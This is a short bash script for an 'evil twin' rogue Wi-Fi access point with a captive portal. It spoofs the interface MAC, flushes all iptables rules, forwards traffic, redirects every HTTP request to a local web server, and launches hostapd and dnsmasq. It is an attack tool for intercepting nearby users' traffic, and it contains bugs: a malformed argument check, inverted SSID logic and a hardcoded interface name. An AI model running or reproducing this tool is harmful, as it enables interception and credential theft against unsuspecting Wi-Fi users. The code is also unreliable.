#!/bin/bash

if [ "$(id -u)" != "0" ]; then
	echo "Please run as root"
	exit 1
fi

ARGC=$#

if [[ARGC -ne 2]]
then
    echo "pemba: A (very) simple evil twin access point captive portal suite"
    echo "command: $0 <evil_interface> <internet_interafce> <ssid>"
fi

EVIL_IFACE=$1
GOOD_IFACE=$2

macchanger -r $EVIL_IFACE

# Enable IP forwarding
sysctl net.ipv4.ip_forward=1

# Little Bobby Tables
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# Share internet at $EVIL_IFACE
iptables -N GOBWEB -t nat

iptables -t nat -A PREROUTING -j GOBWEB
iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 80 --to-destination 192.168.1.1:80
iptables -t nat -A GOBWEB -p udp -j DNAT --dport 80 --to-destination 192.168.1.1:80

iptables -t filter -A FORWARD -i $EVIL_IFACE -o wlo1 -j ACCEPT
iptables -t nat -A POSTROUTING -o wlo1 -j MASQUERADE

# Assign static ip address
ip addr flush dev $EVIL_IFACE
ip addr add 192.168.1.1/24 dev $EVIL_IFACE

# Start DHCP server
dnsmasq -i $EVIL_IFACE --dhcp-range=192.168.1.10,192.168.1.200,12h

sed -i "s/interface=.*$/interface=$EVIL_IFACE/" hostapd.conf
if [[ -z "$3" ]]
then
    sed -i "s/ssid.*$/ssid=$3/" hostapd.conf
fi

# Oh apache and friends, how much I hate thou
go run gobweb.go &

# Create AP, WPA2 mode
hostapd hostapd.conf

killall dnsmasq
killall gobweb

sysctl net.ipv4.ip_forward=0
